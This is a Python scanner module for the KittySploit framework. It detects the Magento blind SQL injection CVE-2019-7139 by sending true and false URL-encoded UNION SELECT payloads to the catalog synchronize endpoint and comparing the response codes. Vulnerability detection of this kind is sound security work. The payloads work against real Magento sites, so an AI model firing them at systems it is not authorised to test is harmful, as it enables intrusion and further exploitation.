#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Magento catalog synchronize blind SQLi (CVE-2019-7139)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Magento - catalog synchronize SQLi Detection (CVE-2019-7139)',
        'description': (
            'Detects CVE-2019-7139 by comparing true/false UNION SELECT payloads on '
            '/catalog/product_frontend_action/synchronize (400 vs 200).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'cve', 'cve2019', 'magento', 'sqli', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2019-7139'],
        'cve': 'CVE-2019-7139',
    }

    base_path = OptString('', 'Optional Magento base path', required=False)

    def _prefix(self) -> str:
        base = str(self.base_path or '').strip()
        if not base or base == '/':
            return ''
        if not base.startswith('/'):
            base = '/' + base
        return base.rstrip('/')

    def run(self):
        base = (
            f'{self._prefix()}/catalog/product_frontend_action/synchronize'
            '?type_id=recently_products&ids%5B0%5D%5Badded_at%5D=&'
            'ids%5B0%5D%5Bproduct_id%5D%5Bfrom%5D=%3F&ids%5B0%5D%5Bproduct_id%5D%5Bto%5D='
        )
        true_p = '%29%29%29+OR+%28SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+333%3D333%29+--+-'
        false_p = '%29%29%29+OR+%28SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+333%3D334%29+--+-'
        # Greenbone: true condition first expects 400, false then 200 => vulns
        r1 = self.http_request(method='GET', path=base + true_p, allow_redirects=False)
        if not r1 or r1.status_code != 400:
            return False
        r2 = self.http_request(method='GET', path=base + false_p, allow_redirects=False)
        if r2 and r2.status_code == 200:
            self.set_info(
                severity='high',
                reason='Magento catalog synchronize blind SQLi (CVE-2019-7139)',
                path=f'{self._prefix()}/catalog/product_frontend_action/synchronize',
            )
            return True
        return False
